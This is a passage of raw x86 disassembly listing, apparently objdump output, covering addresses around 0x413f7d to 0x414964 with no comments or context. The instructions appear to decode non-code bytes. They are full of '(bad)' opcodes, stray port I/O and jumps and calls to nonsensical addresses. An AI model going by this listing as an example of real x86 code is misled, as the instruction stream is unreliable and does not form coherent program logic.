  413f7d:	in     al,0xe2
  413f7f:	lods   al,BYTE PTR ds:[esi]
  413f80:	(bad)  
  413f81:	call   0x250a612b
  413f86:	fs xchg edx,eax
  413f88:	es ret 0xc3a
  413f8c:	dec    ebp
  413f8d:	pop    esp
  413f8e:	inc    BYTE PTR [edx+0x1d00242e]
  413f94:	and    DWORD PTR [edx+esi*1],ebx
  413f97:	dec    esp
  413f98:	add    al,0xf
  413f9a:	inc    esi
  413f9b:	ins    BYTE PTR es:[edi],dx
  413f9c:	int3   
  413f9d:	xlat   BYTE PTR ds:[ebx]
  413f9e:	mov    WORD PTR [edx+0x22f4e5bf],?
  413fa4:	or     al,0x3b
  413fa6:	sub    al,0x96
  413fa8:	cmp    eax,esp
  413faa:	or     bh,BYTE PTR [esi]
  413fac:	out    dx,al
  413fad:	sub    cl,dh
  413faf:	inc    ebp
  413fb0:	cdq    
  413fb1:	jg     0x413f7d
  413fb3:	inc    esp
  413fb4:	add    al,0xad
  413fb6:	sbb    al,0xfd
  413fb8:	data16 or al,dh
  413fbb:	jb     0x413fb0
  413fbd:	and    eax,0x3f54e520
  413fc2:	mov    DWORD PTR [esi*8-0x7779cd4b],0x5fe3153c
  413fcd:	lahf   
  413fce:	sahf   
  413fcf:	(bad)  
  413fd0:	mov    ecx,0xbea1f29
  413fd5:	cwde   
  413fd6:	pushf  
  413fd7:	jg     0x414051
  413fd9:	sbb    eax,0x5ddf38fe
  413fde:	pop    ebx
  413fdf:	in     eax,0xa7
  413fe1:	dec    ebx
  413fe2:	add    cl,BYTE PTR [edx+0x66]
  413fe5:	push   es
  413fe6:	mov    ds:0x3eacfb8,eax
  413feb:	(bad)  
  413fec:	(bad)  
  413fee:	cmp    DWORD PTR [edi],eax
  413ff0:	ins    BYTE PTR es:[edi],dx
  413ff1:	pop    esp
  413ff2:	dec    ebx
  413ff3:	rcr    BYTE PTR [ebx-0x3c0935ca],cl
  413ff9:	std    
  413ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ffb:	xchg   esp,eax
  413ffc:	push   esp
  413ffd:	cdq    
  413ffe:	mov    ecx,0xbc0ceb71
  414003:	arpl   WORD PTR [ebx+0x1ea82048],bp
  414009:	pop    esp
  41400a:	mov    ds:0xc2fcb904,eax
  41400f:	or     bh,BYTE PTR [ecx-0x64]
  414012:	pop    ds
  414013:	push   esp
  414014:	into   
  414015:	mov    ebx,es
  414017:	fsubr  st(6),st
  414019:	push   ss
  41401a:	mov    esi,0xb34af7dd
  41401f:	call   0x8c3cfa06
  414024:	aaa    
  414025:	loop   0x413fae
  414027:	push   esp
  414028:	push   edx
  414029:	les    edi,FWORD PTR [eax]
  41402b:	dec    edx
  41402c:	xor    bh,ch
  41402e:	(bad)  
  41402f:	or     al,0xe2
  414031:	add    DWORD PTR [esi-0x3b],esp
  414034:	cmp    ebx,esi
  414036:	mov    dl,0xf4
  414038:	or     al,0x5d
  41403a:	inc    ebx
  41403b:	mov    DWORD PTR [ebx-0x3f],edi
  41403e:	cdq    
  41403f:	inc    ebx
  414040:	pop    es
  414041:	lods   eax,DWORD PTR ds:[esi]
  414042:	jmp    0x995e6a48
  414047:	mov    ds:0x290e9b24,al
  41404c:	xor    ah,BYTE PTR [ecx]
  41404e:	push   eax
  41404f:	mov    esi,0x5efc64eb
  414054:	(bad)  
  414055:	retf   
  414056:	sbb    dl,BYTE PTR [esi]
  414058:	cli    
  414059:	test   al,0xa5
  41405b:	test   al,0x65
  41405d:	jns    0x413ff8
  41405f:	inc    esp
  414060:	mov    bh,ah
  414062:	ins    BYTE PTR es:[edi],dx
  414063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414064:	repnz (bad) 
  414066:	in     al,0xe3
  414068:	enter  0x91b4,0xb7
  41406c:	je     0x414068
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0xcf8c:0x77d52e96
  4140e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140e6:	fadd   DWORD PTR [bx+si]
  4140e9:	add    BYTE PTR [eax],al
  4140eb:	add    DWORD PTR [eax],eax
  4140ed:	add    BYTE PTR [edx-0x283c9a85],ah
  4140f3:	adc    al,0xcc
  4140f5:	scas   eax,DWORD PTR es:[edi]
  4140f6:	in     al,0xb5
  4140f8:	sbb    al,0x4f
  4140fa:	cwde   
  4140fb:	rcl    esp,0x72
  4140fe:	out    dx,al
  4140ff:	inc    eax
  414100:	xchg   edx,eax
  414101:	stc    
  414102:	cld    
  414103:	push   ebp
  414104:	and    ah,dl
  414106:	(bad)  
  414107:	ins    BYTE PTR es:[edi],dx
  414108:	sub    esi,DWORD PTR [edi-0x47]
  41410b:	xchg   esi,eax
  41410c:	inc    edx
  41410d:	lds    eax,FWORD PTR [edi]
  41410f:	call   0xdce7eef4
  414114:	idiv   BYTE PTR [eax+0x51d0ebdb]
  41411a:	xchg   esp,eax
  41411b:	sbb    BYTE PTR [edx],bh
  41411d:	cmp    dl,BYTE PTR [ecx+0x38]
  414120:	enter  0x9f6d,0xd2
  414124:	mov    bh,0x94
  414126:	cmp    ebx,DWORD PTR [edi+0x49ec844b]
  41412c:	fnsave [edx-0x50]
  41412f:	(bad)  [edx+ecx*1+0x5a]
  414133:	inc    ebp
  414134:	jb     0x4140bf
  414136:	xor    ah,ch
  414138:	sbb    dl,dl
  41413a:	cmp    edx,esi
  41413c:	push   edx
  41413d:	jecxz  0x414168
  41413f:	cdq    
  414140:	es push ecx
  414142:	push   edi
  414143:	aam    0x10
  414145:	pusha  
  414146:	hlt    
  414147:	aaa    
  414148:	mov    ecx,0xbb330b15
  41414d:	jae    0x4140e3
  41414f:	ds dec edi
  414151:	push   esi
  414152:	out    dx,eax
  414153:	jmp    0x4140e1
  414155:	mov    bh,0x1b
  414157:	mov    es,WORD PTR [esi+0x62f80efd]
  41415d:	pop    ss
  41415e:	retf   
  41415f:	mov    dh,0xca
  414161:	pop    eax
  414162:	xor    BYTE PTR [edx-0x24],ah
  414165:	addr16 loope 0x41410e
  414168:	cmp    eax,0x321cf5ad
  41416d:	and    DWORD PTR [ebx],edx
  41416f:	test   eax,0x1bdcb8d3
  414174:	xchg   edx,eax
  414175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414176:	adc    DWORD PTR [edx-0x6a],ebp
  414179:	dec    ecx
  41417a:	inc    edi
  41417b:	retf   
  41417c:	push   0xd366f527
  414181:	retf   
  414182:	dec    edi
  414183:	pop    es
  414184:	and    DWORD PTR [ebx],0xffffffe6
  414187:	stos   BYTE PTR es:[edi],al
  414188:	and    al,0x2a
  41418a:	pop    ss
  41418b:	inc    eax
  41418c:	lea    edi,[ebp+0x240dd575]
  414192:	fs ins DWORD PTR es:[edi],dx
  414194:	push   ecx
  414195:	dec    edi
  414196:	mov    ebp,DWORD PTR [ecx+0xc85cbca]
  41419c:	jl     0x4141d0
  41419e:	gs pop ds
  4141a0:	and    BYTE PTR [esi],dl
  4141a2:	mov    esi,0x172a7fe5
  4141a7:	inc    ebp
  4141a8:	sbb    ebx,DWORD PTR [eax+eiz*2-0x27]
  4141ac:	pop    ds
  4141ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141ae:	js     0x414229
  4141b0:	rol    edi,1
  4141b2:	fisttp DWORD PTR [eax+0x1b7ff3db]
  4141b8:	nop
  4141b9:	outs   dx,DWORD PTR ds:[esi]
  4141ba:	call   0xa2bff817
  4141bf:	pop    ecx
  4141c0:	test   al,0x47
  4141c2:	pop    esp
  4141c3:	adc    al,0xeb
  4141c5:	(bad)
  4141c8:	(bad)  
  4141ca:	idiv   DWORD PTR [eax+0x7f]
  4141cd:	push   ebx
  4141ce:	add    DWORD PTR [edi],edi
  4141d0:	xor    BYTE PTR [ebx+0x2e99c2f],dh
  4141d6:	loop   0x414225
  4141d8:	aam    0x74
  4141da:	mov    cl,dh
  4141dc:	jb     0x41423c
  4141de:	ds dec edi
  4141e0:	loope  0x414258
  4141e2:	das    
  4141e3:	push   cs
  4141e4:	popa   
  4141e5:	jecxz  0x4141f5
  4141e7:	mov    ds:0xe0ff1a99,al
  4141ec:	push   ecx
  4141ed:	sahf   
	...
  414256:	add    dl,BYTE PTR [edx]
  414258:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	xchg   esi,eax
  414263:	xchg   edx,eax
  414264:	retf   0x67dd
  414267:	fld    DWORD PTR [eax]
  414269:	add    BYTE PTR [eax],al
  41426b:	add    DWORD PTR [eax],eax
  41426d:	add    BYTE PTR [ebx+0x6f2a4bd3],cl
  414273:	imul   edx,ebp,0xa1f754fb
  414279:	dec    edx
  41427a:	nop
  41427b:	test   eax,0x4c01a716
  414280:	cmp    eax,0x94cf05e9
  414285:	out    0xa5,eax
  414287:	adc    ch,BYTE PTR [esi+0x566b7251]
  41428d:	out    dx,eax
  41428e:	(bad)  
  41428f:	jbe    0x414229
  414291:	inc    ebp
  414292:	pushf  
  414293:	arpl   WORD PTR [ebp+0x6],si
  414296:	call   0x3313f057
  41429b:	dec    ebp
  41429c:	es jle 0x41427e
  41429f:	add    eax,0xf637e8e3
  4142a4:	retf   0x6f4f
  4142a7:	mov    ebp,0xde779c18
  4142ac:	jmp    DWORD PTR [edx]
  4142ae:	jle    0x414297
  4142b0:	push   edi
  4142b1:	push   ebp
  4142b2:	aaa    
  4142b3:	test   eax,0xe22bdb69
  4142b8:	pop    esp
  4142b9:	inc    ecx
  4142ba:	lock or DWORD PTR [ecx],esi
  4142bd:	int3   
  4142be:	sahf   
  4142bf:	fs ins DWORD PTR es:[edi],dx
  4142c1:	mov    cl,0x7d
  4142c3:	mov    BYTE PTR [edi+edx*8+0x20],bl
  4142c7:	icebp  
  4142c8:	aad    0x5
  4142ca:	cmp    BYTE PTR [edi+0x38],dh
  4142cd:	pop    esp
  4142ce:	push   0x9baad562
  4142d3:	in     eax,0xcf
  4142d5:	sbb    cl,dl
  4142d7:	shl    BYTE PTR [eax-0x2d3162df],cl
  4142dd:	xor    DWORD PTR [edi+0x73340e03],eax
  4142e3:	mov    ch,0x4e
  4142e5:	jae    0x414315
  4142e7:	out    0x2,eax
  4142e9:	push   ds
  4142ea:	ror    DWORD PTR [edx+0x2bccd5ea],0x36
  4142f1:	add    BYTE PTR [ebx-0x37],bl
  4142f4:	pop    es
  4142f5:	pop    DWORD PTR ds:0x51750fff
  4142fb:	add    ebx,ebp
  4142fd:	lds    ecx,FWORD PTR [ebx+ebx*4]
  414300:	in     al,dx
  414301:	js     0x4142e0
  414303:	cmp    DWORD PTR [ecx+0x315ca17f],ebp
  414309:	jl     0x414362
  41430b:	aam    0x5
  41430d:	imul   edx,DWORD PTR [ebp+0x7b],0xffffffc6
  414311:	lods   eax,DWORD PTR ds:[esi]
  414312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414313:	ins    BYTE PTR es:[edi],dx
  414314:	jbe    0x4142eb
  414316:	int3   
  414317:	push   ecx
  414318:	ja     0x4142cb
  41431a:	xchg   BYTE PTR [esi],bl
  41431c:	inc    eax
  41431d:	mov    WORD PTR [edi],es
  41431f:	popa   
  414320:	sub    BYTE PTR [edx+0x3e],0x89
  414324:	push   ebp
  414325:	jmp    0x3ca746d6
  41432a:	ret    0x47b7
  41432d:	(bad)  
  41432e:	aam    0x7c
  414330:	jb     0x414321
  414332:	fwait
  414333:	dec    edi
  414334:	test   eax,0xfcea9e5a
  414339:	mov    ebx,DWORD PTR [esi]
  41433b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41433c:	sub    al,0x64
  41433e:	outs   dx,BYTE PTR ds:[esi]
  41433f:	ins    BYTE PTR es:[edi],dx
  414340:	pushf  
  414341:	mov    esp,0xfe29e0e7
  414346:	xchg   esi,eax
  414347:	pusha  
  414348:	dec    ebp
  414349:	jle    0x4143c6
  41434b:	bound  esi,QWORD PTR [ebx+0x6f5fe74b]
  414351:	xchg   esp,eax
  414352:	in     eax,0x9
  414354:	push   0x9555c2fd
  414359:	or     BYTE PTR ds:0x4b235fed,bh
  41435f:	cld    
  414360:	adc    esi,eax
  414362:	mov    ebp,DWORD PTR [edi]
  414364:	mov    edi,0x4a204ee2
  414369:	push   ss
  41436a:	outs   dx,BYTE PTR ds:[esi]
  41436b:	scas   al,BYTE PTR es:[edi]
  41436c:	das    
  41436d:	jmp    0x0:0x0
	...
  4143d4:	add    BYTE PTR [eax],al
  4143d6:	add    DWORD PTR [ecx-0x2122293],eax
  4143dc:	mov    cl,0xdd
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	xor    DWORD PTR [edi+esi*4],ebp
  4143e5:	dec    ecx
  4143e6:	fiadd  DWORD PTR [bx+si]
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    DWORD PTR [eax],eax
  4143ed:	add    BYTE PTR [eax],bl
  4143ef:	cmp    cl,BYTE PTR [esi-0x7d]
  4143f2:	in     eax,dx
  4143f3:	xor    al,0x97
  4143f5:	scas   eax,DWORD PTR es:[edi]
  4143f6:	or     BYTE PTR [edi],dh
  4143f8:	(bad)  
  4143f9:	pop    esp
  4143fa:	lea    ebx,[edx]
  4143fc:	loopne 0x4143a4
  4143fe:	lods   al,BYTE PTR ds:[esi]
  4143ff:	add    eax,0x5f272f17
  414404:	mov    ecx,0x802156d4
  414409:	xchg   ecx,eax
  41440a:	fisttp QWORD PTR [ecx]
  41440c:	jmp    edx
  41440e:	sub    esi,DWORD PTR [edi]
  414410:	xor    edi,DWORD PTR [ebx]
  414412:	(bad)  
  414413:	cmp    eax,DWORD PTR [ebx*4-0xe78ae9a]
  41441a:	loop   0x414486
  41441c:	aas    
  41441d:	pop    ecx
  41441e:	(bad)  
  41441f:	push   ds
  414420:	fnsave [ebx]
  414422:	dec    eax
  414423:	mov    ah,0x96
  414425:	and    eax,0x53ede939
  41442a:	cmp    bh,bl
  41442c:	mov    ecx,0x22e85377
  414431:	inc    edx
  414432:	inc    esi
  414433:	ret    
  414434:	arpl   WORD PTR [ebx-0x46],di
  414437:	inc    esp
  414438:	dec    ebx
  414439:	fwait
  41443a:	(bad)  
  41443b:	rol    bh,1
  41443d:	pop    es
  41443e:	repnz fldenv [esi-0x7b8367d0]
  414445:	stos   DWORD PTR es:[edi],eax
  414446:	loope  0x414457
  414448:	inc    edi
  414449:	add    BYTE PTR [edi-0x68],0x4c
  41444d:	repnz xchg esp,eax
  41444f:	xor    edx,edx
  414451:	in     eax,0xca
  414453:	mov    BYTE PTR [esi-0x1f],ah
  414456:	xor    dh,BYTE PTR [ebx+0x3c]
  414459:	cld    
  41445a:	loop   0x414421
  41445c:	jg     0x4143f4
  41445e:	and    eax,DWORD PTR [edi+0x7c2ef5de]
  414464:	pop    esp
  414465:	mov    dl,0xb5
  414467:	or     al,0x5e
  414469:	(bad)  
  41446b:	sbb    BYTE PTR [eax-0x14],ah
  41446e:	jecxz  0x4143f0
  414470:	(bad)  
  414471:	sbb    DWORD PTR [edx+0x3bfb9455],edx
  414477:	or     DWORD PTR [edx+0x1462525e],edx
  41447d:	mov    esi,DWORD PTR [ebx+0x26aed2fc]
  414483:	sbb    bh,BYTE PTR [eax+eax*8]
  414486:	sub    esp,0xa
  414489:	in     al,dx
  41448a:	inc    esp
  41448b:	(bad)  
  41448c:	jae    0x4144d2
  41448e:	popf   
  41448f:	(bad)  
  414490:	mov    ecx,0x95785b94
  414495:	adc    eax,0xd19f4af5
  41449a:	sub    al,0x65
  41449c:	pusha  
  41449d:	or     eax,0xec331747
  4144a2:	icebp  
  4144a3:	fistp  QWORD PTR [esi-0x66]
  4144a6:	les    ebx,FWORD PTR [ebp+0x45]
  4144a9:	and    eax,0xcd01cdbf
  4144ae:	and    al,0xce
  4144b0:	inc    esi
  4144b1:	clc    
  4144b2:	adc    DWORD PTR [ebx],edx
  4144b4:	pop    edi
  4144b5:	jmp    0x414494
  4144b7:	mov    ah,0xb9
  4144b9:	dec    ebp
  4144ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144bb:	dec    BYTE PTR [edx+esi*8+0x1c]
  4144bf:	shr    DWORD PTR [ecx-0x26f9bbcd],cl
  4144c5:	shl    edi,1
  4144c7:	imul   ecx,ebp,0xffffff83
  4144ca:	je     0x41454a
  4144cc:	loopne 0x414543
  4144ce:	jg     0x41448a
  4144d0:	loope  0x4144a6
  4144d2:	out    dx,eax
  4144d3:	mov    WORD PTR [ecx+0xcf10b19],gs
  4144d9:	(bad)  
  4144da:	push   ebp
  4144db:	sub    DWORD PTR [eax+0x5a987183],0xa5e2a784
  4144e5:	sbb    esi,DWORD PTR [edi]
  4144e7:	loop   0x4144c6
  4144e9:	mov    BYTE PTR [ecx+0x2964d4],bl
	...
  414553:	add    BYTE PTR [eax],al
  414555:	add    BYTE PTR [ebx+0x73],bl
  414558:	inc    edx
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi+0x70]
  414563:	rcl    BYTE PTR [ebx+0xdb6727],cl
  414569:	add    BYTE PTR [eax],al
  41456b:	add    DWORD PTR [eax],eax
  41456d:	add    BYTE PTR ds:0x8eca73df,ah
  414573:	repnz push esi
  414575:	or     BYTE PTR [ebp+0x89acbbb],0xce
  41457c:	xor    ah,BYTE PTR [ecx-0x62044536]
  414582:	xor    ebp,DWORD PTR [ebp+0x7]
  414585:	fbld   TBYTE PTR [edx-0x302d7d23]
  41458b:	sub    al,0x11
  41458d:	loopne 0x414563
  41458f:	or     al,0x65
  414591:	inc    esi
  414592:	xchg   ebx,eax
  414593:	jmp    0x80dc0caf
  414598:	les    ecx,FWORD PTR [ecx]
  41459a:	push   ebp
  41459b:	or     eax,DWORD PTR [ecx-0x3548367a]
  4145a1:	cwde   
  4145a2:	test   al,0xb6
  4145a4:	mov    dl,0xac
  4145a6:	xor    dh,ah
  4145a8:	data16 hlt 
  4145aa:	loop   0x41457b
  4145ac:	mov    bl,0x36
  4145ae:	lock add DWORD PTR [ebp-0x3d80f30c],0xfffffffc
  4145b6:	aad    0xce
  4145b8:	push   edx
  4145b9:	dec    esp
  4145ba:	aas    
  4145bb:	sub    eax,edx
  4145bd:	push   edx
  4145be:	inc    eax
  4145bf:	out    0xea,eax
  4145c1:	arpl   WORD PTR [ecx-0x6f22b518],ax
  4145c7:	hlt    
  4145c8:	neg    ebx
  4145ca:	mov    ds:0x29a15636,al
  4145cf:	dec    eax
  4145d0:	aad    0x88
  4145d2:	outs   dx,DWORD PTR ds:[esi]
  4145d3:	rol    BYTE PTR [ebp-0x6e1fc454],cl
  4145d9:	mov    ebp,0xdd21c752
  4145df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145e0:	dec    esi
  4145e1:	arpl   WORD PTR [ecx],bp
  4145e3:	push   es
  4145e4:	cmp    BYTE PTR [edi-0x1da27f22],bh
  4145ea:	loope  0x41463c
  4145ec:	icebp  
  4145ed:	pop    eax
  4145ee:	data16 jno 0x41464d
  4145f1:	sbb    bl,BYTE PTR [edx]
  4145f3:	jnp    0x4145a1
  4145f5:	in     eax,dx
  4145f6:	inc    esi
  4145f7:	mov    ah,BYTE PTR [esi+0x5c]
  4145fa:	push   edx
  4145fb:	call   0x5c80fa6c
  414600:	push   es
  414601:	push   es
  414602:	loope  0x414626
  414604:	mov    bh,0xe5
  414606:	aas    
  414607:	inc    edi
  414608:	leave  
  414609:	or     DWORD PTR [edi-0x3d2a46dc],esp
  41460f:	imul   ebx,DWORD PTR [edx-0xbf27e0e],0xffffff9e
  414616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414617:	adc    cl,BYTE PTR [esi+0x47]
  41461a:	inc    edx
  41461b:	and    bh,dh
  41461d:	xchg   edi,eax
  41461e:	clc    
  41461f:	lods   eax,DWORD PTR ds:[esi]
  414620:	xchg   ecx,eax
  414621:	rcl    BYTE PTR [ebp-0x25b22eee],1
  414627:	xchg   esi,eax
  414628:	(bad)  
  414629:	rcr    DWORD PTR [edi-0xf93d070],1
  41462f:	cmc    
  414630:	popf   
  414631:	push   edx
  414632:	mov    ds:0xa3f330d4,al
  414637:	hlt    
  414638:	lods   al,BYTE PTR ds:[esi]
  414639:	xor    dh,dh
  41463b:	cdq    
  41463c:	mov    ecx,0xf01f28f1
  414641:	je     0x4145d7
  414643:	out    0x82,al
  414645:	jne    0x4146ab
  414647:	arpl   di,bx
  414649:	stc    
  41464a:	jp     0x4146c4
  41464c:	jmp    0x1595:0xd7ab963c
  414653:	mov    edi,0x213e236f
  414658:	jae    0x414648
  41465a:	push   ss
  41465b:	bndstx [edx+0x6c],bnd0
  41465f:	in     al,0xda
  414661:	pop    edi
  414662:	or     eax,edx
  414664:	ins    BYTE PTR es:[edi],dx
  414665:	sub    al,0x17
  414667:	push   ds
  414668:	hlt    
  414669:	jo     0x4146bf
  41466b:	hlt    
  41466c:	pop    esp
  41466d:	push   0x0
	...
  4146d3:	add    BYTE PTR [eax],al
  4146d5:	add    BYTE PTR [edi+0x5e],bh
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0x62
  4146e3:	dec    esi
  4146e4:	(bad)  
  4146e6:	fadd   QWORD PTR [bx+si]
  4146e9:	add    BYTE PTR [eax],al
  4146eb:	add    DWORD PTR [eax],eax
  4146ed:	add    BYTE PTR [ecx+0x7f],cl
  4146f0:	jle    0x414725
  4146f2:	fild   DWORD PTR [ecx*8-0x6e3e6079]
  4146f9:	rcl    BYTE PTR [edx-0x5cf2c0ef],cl
  4146ff:	ret    0xd86c
  414702:	rcl    DWORD PTR [eax+0x979e377],cl
  414708:	add    ecx,DWORD PTR [edi]
  41470a:	mov    ah,0xea
  41470c:	sub    al,cl
  41470e:	mov    ds:0xad0b8031,eax
  414713:	imul   dx,bx,0xffe5
  414717:	gs cmp eax,0xb66bde03
  41471d:	(bad)  [ebx+esi*2-0x62c9c1f1]
  414724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414725:	xchg   edi,eax
  414726:	nop
  414727:	mov    BYTE PTR [eax],al
  414729:	sbb    BYTE PTR [eax],bl
  41472b:	ror    BYTE PTR [ecx-0x3e69bfc6],0x62
  414732:	adc    al,0xf4
  414734:	fldcw  WORD PTR [edx]
  414736:	and    BYTE PTR [ebp+0x4],0x6b
  41473a:	ror    BYTE PTR [esi],1
  41473c:	xchg   BYTE PTR [ebp-0x2c343909],dl
  414742:	jle    0x414737
  414744:	lahf   
  414745:	dec    esi
  414746:	leave  
  414747:	sbb    al,BYTE PTR [edx-0x7c1eba22]
  41474d:	(bad)  
  41474e:	outs   dx,DWORD PTR ds:[esi]
  41474f:	iret   
  414750:	inc    eax
  414751:	popf   
  414752:	jge    0x414717
  414754:	add    al,0x98
  414756:	scas   al,BYTE PTR es:[edi]
  414757:	inc    edx
  414758:	mov    bh,0x6
  41475a:	repz mov al,0x44
  41475d:	(bad)  
  41475e:	jl     0x8239db9b
  414764:	das    
  414765:	dec    esp
  414766:	imul   esi,DWORD PTR [ecx+esi*2+0x1b2e6608],0x99beaf0f
  414771:	nop
  414772:	int3   
  414773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414774:	dec    ebp
  414775:	hlt    
  414776:	cs inc esi
  414778:	xor    BYTE PTR [ecx+0xd0fedc0],ah
  41477e:	jns    0x41477a
  414780:	pop    edx
  414781:	dec    edx
  414782:	dec    edi
  414783:	push   ecx
  414784:	or     dl,BYTE PTR [esi]
  414786:	and    esi,DWORD PTR [ecx+esi*4-0x64]
  41478a:	xor    al,0x2c
  41478c:	mov    WORD PTR [ecx+0x70107612],fs
  414792:	add    bh,BYTE PTR [edi-0x3b274a83]
  414798:	int3   
  414799:	adc    eax,0xbc5c97e1
  41479e:	push   eax
  41479f:	(bad)  
  4147a1:	mov    ah,0xf7
  4147a3:	out    0xe3,al
  4147a5:	addr16 (bad) 
  4147a7:	pushf  
  4147a8:	int    0xf2
  4147aa:	das    
  4147ab:	cld    
  4147ac:	xchg   esp,eax
  4147ad:	jmp    0x4147b3
  4147af:	inc    ebx
  4147b0:	stc    
  4147b1:	nop
  4147b2:	xchg   esi,eax
  4147b3:	cmp    DWORD PTR [eax],edx
  4147b5:	dec    ebx
  4147b6:	pop    ss
  4147b7:	out    0x95,al
  4147b9:	mov    edx,0xf5014448
  4147be:	pusha  
  4147bf:	(bad)  
  4147c0:	enter  0x7f57,0x1e
  4147c4:	arpl   di,bx
  4147c6:	mov    DWORD PTR [edi-0x5e],edx
  4147c9:	xor    ch,BYTE PTR [ebp+edi*4-0x282cadb1]
  4147d0:	dec    eax
  4147d1:	push   ds
  4147d2:	pop    edi
  4147d3:	xchg   ebp,eax
  4147d4:	dec    edi
  4147d5:	pop    esp
  4147d6:	push   esp
  4147d7:	dec    eax
  4147d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147d9:	das    
  4147da:	mov    ebp,0x51746861
  4147df:	(bad)  
  4147e0:	jge    0x4147cd
  4147e2:	ss mov al,0x69
  4147e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147e6:	fadd   QWORD PTR [esi-0x1c]
  4147e9:	cli    
  4147ea:	loopne 0x4147e6
  4147ec:	push   ebp
  4147ed:	xor    al,0x0
	...
  414853:	add    BYTE PTR [eax],al
  414855:	add    BYTE PTR [esi+0x2f],bh
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0xfe604b4f
  414866:	fld    QWORD PTR [bx+si]
  414869:	add    BYTE PTR [eax],al
  41486b:	add    DWORD PTR [eax],eax
  41486d:	add    ch,bh
  41486f:	call   DWORD PTR [ebx+eiz*4]
  414872:	xchg   esi,eax
  414873:	adc    dl,cl
  414875:	push   ss
  414876:	popf   
  414877:	jae    0x414853
  414879:	cld    
  41487a:	ror    BYTE PTR ds:0xb96c8c46,1
  414880:	pop    ecx
  414881:	cmovnp ebp,DWORD PTR [eax+0x7d5eb437]
  414888:	push   ebp
  414889:	retf   0x10cc
  41488c:	clc    
  41488d:	cmp    al,0x94
  41488f:	test   al,0x6
  414891:	mov    eax,0xd38c6d7
  414896:	xlat   BYTE PTR ds:[ebx]
  414897:	xor    al,0x3
  414899:	sbb    eax,DWORD PTR [eax]
  41489b:	out    0xad,eax
  41489d:	adc    DWORD PTR [esi-0x5bc60252],0x70120d91
  4148a7:	test   eax,0xecb5f12d
  4148ac:	mov    dl,0xb9
  4148ae:	sub    ch,cl
  4148b0:	mov    edi,0x5f8da8e4
  4148b5:	xor    DWORD PTR [esi-0x7814db9],ebp
  4148bb:	loop   0x4148dd
  4148bd:	call   0x864c946c
  4148c2:	or     eax,DWORD PTR [ebx]
  4148c4:	push   eax
  4148c5:	mov    edx,esp
  4148c7:	adc    edi,esi
  4148c9:	fwait
  4148ca:	outs   dx,BYTE PTR gs:[esi]
  4148cc:	ret    
  4148cd:	add    DWORD PTR [edi],0x2d63356b
  4148d3:	into   
  4148d4:	cmp    BYTE PTR [eax],ah
  4148d6:	ror    DWORD PTR [eax],cl
  4148d8:	aam    0x4
  4148da:	out    dx,al
  4148db:	out    0xd5,eax
  4148dd:	rol    eax,cl
  4148df:	push   0xdbc3581a
  4148e4:	push   0x3be45f8b
  4148e9:	outs   dx,DWORD PTR ds:[esi]
  4148ea:	mov    eax,ds:0x5ccec383
  4148ef:	adc    dl,BYTE PTR [ebx+ebx*4]
  4148f2:	aas    
  4148f3:	xor    al,BYTE PTR [edx+0x4f0aec27]
  4148f9:	dec    esp
  4148fa:	out    0x76,al
  4148fc:	sahf   
  4148fd:	push   es
  4148fe:	sub    ah,al
  414900:	ret    
  414901:	mov    dl,0x21
  414903:	push   es
  414904:	xor    DWORD PTR ds:[edx+0x72d01f87],ecx
  41490b:	jge    0x4148e0
  41490d:	mov    esp,DWORD PTR [eax-0x4]
  414910:	scas   eax,DWORD PTR es:[edi]
  414911:	sub    BYTE PTR [ebx+eax*4-0x54],bh
  414915:	repnz dec esp
  414917:	xchg   esi,eax
  414918:	inc    eax
  414919:	fimul  WORD PTR [ebp+ebx*2+0x47b1e0f7]
  414920:	bound  ebp,QWORD PTR [edi-0x3d7f6f95]
  414926:	fwait
  414927:	pop    esi
  414928:	loopne 0x414952
  41492a:	scas   al,BYTE PTR es:[edi]
  41492b:	leave  
  41492c:	pop    es
  41492d:	jae    0x414938
  41492f:	in     eax,dx
  414930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414931:	jmp    0xfb7a:0x5ded0f14
  414938:	daa    
  414939:	lods   eax,DWORD PTR ds:[esi]
  41493a:	inc    esp
  41493b:	ja     0x414964
  41493d:	xchg   edx,eax
  41493e:	outs   dx,BYTE PTR ds:[esi]
  41493f:	pop    es
  414940:	inc    ecx
  414941:	mov    ah,0xf2
  414943:	dec    ebx
  414944:	sub    al,0x80
  414946:	inc    edi
  414947:	outs   dx,DWORD PTR ds:[esi]
  414948:	test   BYTE PTR [ecx],ah
  41494a:	lock imul esi,DWORD PTR [ebx+0x649ed65b],0x7c3a36ac
  414955:	xchg   BYTE PTR [ecx],ch
  414957:	call   0x8b92fc0e
  41495c:	fstp   QWORD PTR [ebp+0x4b5a1138]
  414962:	mov    ah,0x27
  414964:	adc    al,0xb2
